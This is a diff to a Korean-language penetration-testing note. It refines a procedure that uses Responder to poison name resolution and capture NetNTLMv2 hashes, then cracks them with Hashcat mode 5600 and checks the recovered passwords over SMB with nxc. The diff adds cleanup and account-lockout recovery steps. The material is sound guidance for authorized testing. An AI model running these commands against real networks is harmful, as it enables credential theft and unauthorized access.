@@ -93,6 +93,12 @@ sudo responder -I <INTERFACE> -A
 
 요청이 확인된 동일한 Linux 공격 호스트에서 활성 포이즈닝을 시작한다. 실행 중 `response sent`와 `NTLMv1` 또는 `NTLMv2` capture를 서로 다른 상태로 확인한다.
 
+Kali 패키지 기본 경로를 사용한다면 실행 전에 기존 NTLMv2 로그의 경로·byte 크기·수정 시각을 기록한다. 설치 방식이 다르면 Responder 실행 디렉터리의 `logs`로 바꾼다.
+
+```bash
+find /usr/share/responder/logs -maxdepth 1 -type f -name '*NTLMv2*.txt' -printf '%p %s %T@\n'
+```
+
 ```bash
 sudo responder -I <INTERFACE> -v
 ```
@@ -113,12 +119,17 @@ ls -lt /usr/share/responder/logs
 
 ## 4. NetNTLMv2 오프라인 크래킹
 
-Linux 분석 호스트에서 전체 NetNTLMv2 라인을 보존한 로그 파일을 Hashcat mode `5600`으로 처리한다.
+Linux 분석 호스트에서 이번 실행의 전체 NetNTLMv2 라인만 `<RESPONDER_HASH_INPUT>`에 분리하고 Hashcat mode `5600`으로 처리한다. Responder 원본 로그는 여러 실행이 누적될 수 있으므로 직접 potfile처럼 사용하지 않는다.
 
 ```bash
-hashcat -m 5600 '<RESPONDER_LOG>' '<WORDLIST>' --backend-ignore-opencl -d 1 -O -w 3
-hashcat --show -m 5600 '<RESPONDER_LOG>' --backend-ignore-opencl -d 1 -O -w 3
+test ! -e '<RESPONDER_HASH_INPUT>'
+test ! -e '<RESPONDER_POTFILE>'
+tail -c +<FIRST_NEW_BYTE> '<RESPONDER_LOG>' > '<RESPONDER_HASH_INPUT>'
+hashcat -m 5600 '<RESPONDER_HASH_INPUT>' '<WORDLIST>' --potfile-path '<RESPONDER_POTFILE>' --restore-disable --backend-ignore-opencl -d 1 -O -w 3
+hashcat --show -m 5600 '<RESPONDER_HASH_INPUT>' --potfile-path '<RESPONDER_POTFILE>' --backend-ignore-opencl -d 1 -O -w 3
 ```
+
+기존 로그가 갱신됐다면 `<FIRST_NEW_BYTE>`는 실행 전 byte 크기보다 1 큰 값이고, 이번 실행에서 새 파일이 생겼다면 `1`이다. 분리 파일의 각 줄에서 계정·도메인·challenge-response 형식이 이번 실행 화면과 일치하는지 확인한 뒤 크래킹한다.
 
 확인할 출력:
 
@@ -160,20 +171,30 @@ nxc smb <SMB_TARGETS> -d <DOMAIN> -u <USER> -p '<PASSWORD>' --continue-on-succes
 |---|---|---|---|
 | 공격 호스트의 SMB·HTTP·WPAD 등 listener | 실행 전 `sudo ss -luntp` 출력 | 기존 서비스와 포트 충돌 또는 의도하지 않은 인증 수신 | Responder에서 `Ctrl+C` 후 아래 확인 명령 실행 |
 | 링크 로컬 이름 해석 응답 | 실행 시간, 인터페이스와 요청 출발지 | 잘못된 이름 요청이 공격 호스트로 향해 연결 지연·실패 또는 인증 프롬프트 발생 | Responder에서 `Ctrl+C`로 포이즈닝 즉시 중지 |
+| 이번 실행의 hash 입력과 Hashcat potfile | 작업 전 존재하지 않은 `<RESPONDER_HASH_INPUT>`·`<RESPONDER_POTFILE>` exact 경로 | 결과 인계 후 `rm -- '<RESPONDER_HASH_INPUT>' '<RESPONDER_POTFILE>'` | `test ! -e`로 두 경로가 모두 없음 |
+| 서비스 인증 client와 계정 잠금 영향 | client PID·대상·계정·시도 시간, AD라면 시도 전 계정 상태 | 인증 client를 먼저 종료하고 [[원격 비밀번호 공격]]의 계정 잠금 확인·승인된 복구 절차 수행 | 새 인증 시도가 멈추고 client가 종료됨. 잠겼던 계정은 권한 있는 관리자가 접근 복구를 확인 |
 
 ```bash
 pgrep -af responder
 sudo ss -luntp
 ```
 
-Responder 프로세스가 남지 않고 listener 상태가 실행 전 기준과 같아야 한다. 이 시나리오는 `Responder.conf` 변경을 요구하지 않으며, 별도 변경했다면 기록한 원래 값으로 복원한다.
+정리 순서는 추가 인증 시도 중단 → 서비스 client 종료와 계정 상태 확인 → Responder `Ctrl+C` → listener 기준선 대조 → 작업용 hash·potfile 처분이다. Responder 프로세스가 남지 않고 listener 상태가 실행 전 기준과 같아야 한다. 이 시나리오는 `Responder.conf` 변경을 요구하지 않으며, 별도 변경했다면 기록한 원래 값으로 복원한다. Responder 기본 로그는 기존 자료가 누적된 파일일 수 있으므로 이번 실행에서 새로 만든 파일임이 확인되지 않으면 통째로 삭제하지 않는다.
 
 ## 완료 기준
+
+### 공격 목표
 
 - Responder가 이번 실행에서 수집한 계정 식별자와 전체 NetNTLMv2 challenge-response를 확인했다.
 - Hashcat이 평문 비밀번호 후보를 복구했거나, 복구 실패를 `Exhausted` 등 명확한 상태로 기록했다.
 - 복구한 평문이 대상 서비스에서 현재 유효한지 확인하고 인증 성공과 실제 관리자·세션 권한을 구분했다.
 - 평문 비밀번호를 확보했으면 [[확보한 자격 증명으로 원격 접근 경로 선택]], 실시간 Relay를 선택하면 [[NTLM Relay 조건 검토]]로 이동한다.
+
+### 복구 상태
+
+- 인증 client와 Responder가 종료되고 listener가 실행 전 기준으로 돌아왔는지 확인한다.
+- 작업용 hash·potfile의 exact 경로가 제거됐고, 원본 Responder 로그의 보존·폐기 상태를 별도로 기록한다.
+- 계정 잠금이 발생했다면 승인된 복구와 확인이 끝나야 한다. 인증 실패·포이즈닝·서비스 감사 기록은 남으므로 이를 포함해 “완전 원상복구”라고 표현하지 않는다.
 
 ## 관련 노트
 
